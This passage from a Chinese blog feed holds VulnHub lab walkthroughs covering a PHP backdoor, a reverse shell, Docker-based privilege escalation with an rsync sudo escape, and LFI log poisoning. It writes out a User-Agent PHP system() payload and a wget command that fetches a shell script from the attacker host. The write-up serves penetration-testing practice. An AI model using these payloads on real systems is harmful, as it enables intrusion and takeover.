&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1575.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这次直接写一个 post 的一句话后门，可用 antsword 连接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1576.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;连接成功后门，可以继续往此后门中写入反弹 shell 的代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1577.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;写入 mkfifo 构造好的反弹 shell 的代码并保存&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1578.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 curl 执行的同时，用来监听这个端口等到接收反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1579.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;004-gpg文件解密pgptool使用通过docker容器提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-gpg文件解密pgptool使用通过docker容器提权&#34;&gt;#&lt;/a&gt; 004 gpg 文件解密，pgptool 使用，通过 docker 容器提权&lt;/h3&gt;
&lt;p&gt;发现有 p 48 这个用户，切换后输入 electrico 即可切换成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1580.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现了一个 gpg 的私钥文件，看来就是邮件系统中提醒我们用来解开 gpg 加密&lt;br&gt;
后的 ssh 密钥的一个密匙&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1581.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;有一个非常好的解密 gpg 的工具&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZ3B0b29sLmdpdGh1Yi5pby8=&#34;&gt; https://pgptool.github.io/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1582.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;下载好一个 jar 包，选取解密模块，将邮件系统中的 gpg 导入&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1583.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提示需要一个密码，输入 p 48 的密码 electrico&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1584.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;输入解密成功之后导出的文件的位置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#输入解密成功之后导出的文件的位置&#34;&gt;#&lt;/a&gt; 输入解密成功之后导出的文件的位置&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1585.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;解密成功得到了一个 ssh 的私钥文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1586.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;没有用到在用户目录下得到的密匙文件，但是照样把这个 key 得到了，这个&lt;br&gt;
 key 理论上是可以登陆到 p 48 用户的，但是需要注意的是，靶机上没有开放 ssh&lt;br&gt;
 端口，那我们应该怎么连呢&lt;/p&gt;
&lt;p&gt;先把这个文件给 echo 到靶机上，并且改变私钥文件的权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1587.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;注意到当前靶机的 ip 地址中有 dokcer 网卡，既然靶机上没有开放 ssh 端口无&lt;br&gt;
法通过 p 48 的密钥接入到 p 48 用户上，那么是不是可以先用私钥文件进到一台&lt;br&gt;
开通了 ssh 协议的 docker 容器中呢，就试试看&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1588.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;测试一下出了 1 72.17.0.1 的网关地址之外，存活的 docker 主机，找到一台&lt;br&gt;
 172 .17.0.2 是存活主机&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1589.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnA0OEAxNzIuMTcuMC4y&#34;&gt;p48@172.17.0.2&lt;/span&gt; -i id_rsa&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1590.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;成功进入到了 docker 容器内部，用的 p 48 这个用户进去的，看 hostname 像是在&lt;br&gt;
 docker 容器内部，而且有 sudo 权限设置错误，可以直接调用 root 的 rsync&lt;br&gt;
sudo rsync -e ‘sh -c “sh 0&amp;lt;&amp;amp;2 1&amp;gt;&amp;amp;2”’ 127.0.0.1:/dev/null&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1591.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提权到了 root 之后，由于我们还在 docker 内部，ip 也只有一个本地回环地址&lt;br&gt;
和一个 docker 虚拟出来的 ip，但是我们可以与 docker 的网关地址，即宿主机&lt;br&gt;
直接通信，连接到 1 72.17.0.1 就相当于连接到了宿主机，而我们在 docker 内&lt;br&gt;
部连的时候是不需要外部开通 22 端口的&lt;br&gt;
 ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnJvb3RAMTcyLjE3LjAuMQ==&#34;&gt;root@172.17.0.1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1592.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;成功拿到了 root 权限，并且查看到 ip 已经恢复到了宿主机的 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1593.png&#34; alt&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/149%20DURIAN/</guid>
            <title>VULNHUB 49 DURIAN</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/149%20DURIAN/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==&#34;&gt;https://www.vulnhub.com/entry/cereal-1,703/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15779414.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168. 0 .x (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 DURIAN：桥接于 1 92.168. 0 .1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1518.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.18 8 --min-rate=5000&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1519.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1520.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;检索到的有效服务如下所示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检索到的有效服务如下所示&#34;&gt;#&lt;/a&gt; 检索到的有效服务如下所示：&lt;/h3&gt;
&lt;p&gt;22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 、 7080 、 8000 、 8088 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
&lt;h3 id=&#34;002-信息收集目录爆破有效信息检索lfi漏洞测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-信息收集目录爆破有效信息检索lfi漏洞测试&#34;&gt;#&lt;/a&gt; 002 信息收集，目录爆破，有效信息检索，lfi 漏洞测试&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgu&#34;&gt;http://192.168.&lt;/span&gt; 0. 188 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1521.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4x&#34;&gt;http://192.168.0.1&lt;/span&gt; 88 /&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1522.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1523.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEv&#34;&gt;http://192.168.0.172/cgi-data/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1524.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhw&#34;&gt;http://192.168.0.172/cgi-data/getImage.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1525.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;有文件包含漏洞，测试读取 /etc/passwd&lt;br&gt;
view-source:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhwP2ZpbGU9Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==&#34;&gt;http://192.168.0.172/cgi-data/getImage.php?file=../../../../../etc/passwd&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1526.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到了两个有 bash 的用户，测试能否读取到私钥文件&lt;br&gt;
 view-source:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLQ==&#34;&gt;http://192.168.0.172/cgi-&lt;/span&gt;&lt;br&gt;
data/getImage.php?file=…/…/…/…/…/home/durian/.ssh/id_rsa&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1527.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;没有读取到私钥文件，此 lfi 漏洞利用还需要配合其他的漏洞，如果知道了日&lt;br&gt;
志文件地址，是可以尝试往日志里边写后门的&lt;/p&gt;
&lt;h3 id=&#34;查看一下其他的信息获取到更多的信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看一下其他的信息获取到更多的信息&#34;&gt;#&lt;/a&gt; 查看一下其他的信息，获取到更多的信息&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvYmxvZw==&#34;&gt;http://192.168.0.172/blog&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1528.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;7080 站点有一个登陆框，但是不存在弱口令，sql 注入&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1529.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;8000-站点是一张图片需要目录收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8000-站点是一张图片需要目录收集&#34;&gt;#&lt;/a&gt; 8000 站点是一张图片，需要目录收集&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1530.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;没有发现什么敏感的目录信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没有发现什么敏感的目录信息&#34;&gt;#&lt;/a&gt; 没有发现什么敏感的目录信息&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1531.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;8088-页面也是一个图片没有什么特点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8088-页面也是一个图片没有什么特点&#34;&gt;#&lt;/a&gt; 8088 页面也是一个图片，没有什么特点&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1532.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;搜寻目录之后发现一些特殊的目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搜寻目录之后发现一些特殊的目录&#34;&gt;#&lt;/a&gt; 搜寻目录之后发现一些特殊的目录&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1533.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;发现大部分页面都是-403-没有利用的价值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现大部分页面都是-403-没有利用的价值&#34;&gt;#&lt;/a&gt; 发现大部分页面都是 403 , 没有利用的价值&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1534.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;有一个界面有登陆框和密码可以用来爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有一个界面有登陆框和密码可以用来爆破&#34;&gt;#&lt;/a&gt; 有一个界面有登陆框和密码，可以用来爆破&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1535.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;003-lfi漏洞利用寻找日志文件往日志文件中写木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-lfi漏洞利用寻找日志文件往日志文件中写木马&#34;&gt;#&lt;/a&gt; 003 lfi 漏洞利用，寻找日志文件，往日志文件中写木马&lt;/h3&gt;
&lt;h3 id=&#34;综上是能收集到所有的信息登陆框处由于缺少用户名是很难爆破出来的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#综上是能收集到所有的信息登陆框处由于缺少用户名是很难爆破出来的&#34;&gt;#&lt;/a&gt; 综上是能收集到所有的信息，登陆框处由于缺少用户名，是很难爆破出来的，&lt;/h3&gt;
&lt;p&gt;唯一有价值的线索指向了 lfi 漏洞，多次尝试之后找到了日志的路径&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhwP2ZpbGU9L3Zhci9sb2cvZHVyaWFuLmxvZy9hY2Nlc3MubG9n&#34;&gt; http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1536.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;既然信息能够被保存在这里就给发送一个带木马的信息修改ua头&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#既然信息能够被保存在这里就给发送一个带木马的信息修改ua头&#34;&gt;#&lt;/a&gt; 既然信息能够被保存在这里，就给发送一个带木马的信息，修改 UA 头&lt;/h3&gt;
&lt;p&gt;这里直接用 curl 命令来写，可以用 burp 将数据转化为 curl 命令&lt;br&gt;
 curl -v -X $‘GET’ -H &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi&gt;M&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;5.0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;?&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;&amp;#x27;User-Agent: Mozilla/5.0 &amp;lt;?php system(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.835222em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET[‘X_T’]); ?&amp;gt;&lt;br&gt;
(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&lt;br&gt;
Chrome/103.0.0.0 Safari/537.36’ $‘&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODgvY2dpLQ==&#34;&gt;http://192.168.0.188/cgi-&lt;/span&gt;&lt;br&gt;
data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;X_T=whoami’&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1537.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;并且命令被执行了，收到了 www-data 即当前用户名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1538.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;既然能够执行命令，那么就准备用日志来反弹 shell，准备如下代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1539.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过修改数据报使靶机下载 kali 上准备好的反弹 shell 的代码&lt;br&gt;
 GET &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODgvY2dpLQ==&#34;&gt;http://192.168.0.188/cgi-&lt;/span&gt;&lt;br&gt;
data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;X_T=wget+http://192.168.0.1&lt;br&gt;
68/shell.sh±O+/var/www/html/blog/shell.sh HTTP/1.1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1540.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;但是失败了没有下载提示也没有合适的数据报返回&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#但是失败了没有下载提示也没有合适的数据报返回&#34;&gt;#&lt;/a&gt; 但是失败了，没有下载提示，也没有合适的数据报返回&lt;/h3&gt;
&lt;p&gt;改为 post 的方式，写一个后门文件看看，居然写成功了，但是不知道怎么访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1541.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 lfi 漏洞的位置访问时是无法写入任何文件的，是个假后门&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1542.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;并且也不能修改原有的所有代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#并且也不能修改原有的所有代码&#34;&gt;#&lt;/a&gt; 并且也不能修改原有的所有代码&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1543.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;还是从数据包来下手可能下载成功了没有回显索性就直接尝试执行本应该&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#还是从数据包来下手可能下载成功了没有回显索性就直接尝试执行本应该&#34;&gt;#&lt;/a&gt; 还是从数据包来下手，可能下载成功了没有回显，索性就直接尝试执行本应该&lt;/h3&gt;
&lt;p&gt;下载好的文件位置的 sh 脚本，看能不能把 shell 反弹出来&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1544.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;但是没有反弹出来很奇怪&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#但是没有反弹出来很奇怪&#34;&gt;#&lt;/a&gt; 但是没有反弹出来，很奇怪&lt;/h3&gt;
&lt;h3 id=&#34;004-防火墙策略curl自定义发包linpeas检索gdb提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-防火墙策略curl自定义发包linpeas检索gdb提权&#34;&gt;#&lt;/a&gt; 004 防火墙策略，curl 自定义发包，linpeas 检索，gdb 提权&lt;/h3&gt;
&lt;p&gt;试了大半天没有结果，直接重新导入靶机了，这次靶机 ip 发生变化了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1545.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;再次用 burp 捕获数据，思考为什么不能反弹&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1546.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;既然可以执行命令，执行处 id 的结果，说明命令执行没有问题，但是去下载&lt;br&gt;
 python 简易 web 上的程序时出错了，很有可能是防火墙的问题，果然一看，防&lt;br&gt;
火墙不知道因为什么原因打开了，就一直卡住了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1547.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;关闭防火墙再次测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#关闭防火墙再次测试&#34;&gt;#&lt;/a&gt; 关闭防火墙，再次测试&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1548.png&#34; alt&gt;&lt;/p&gt;
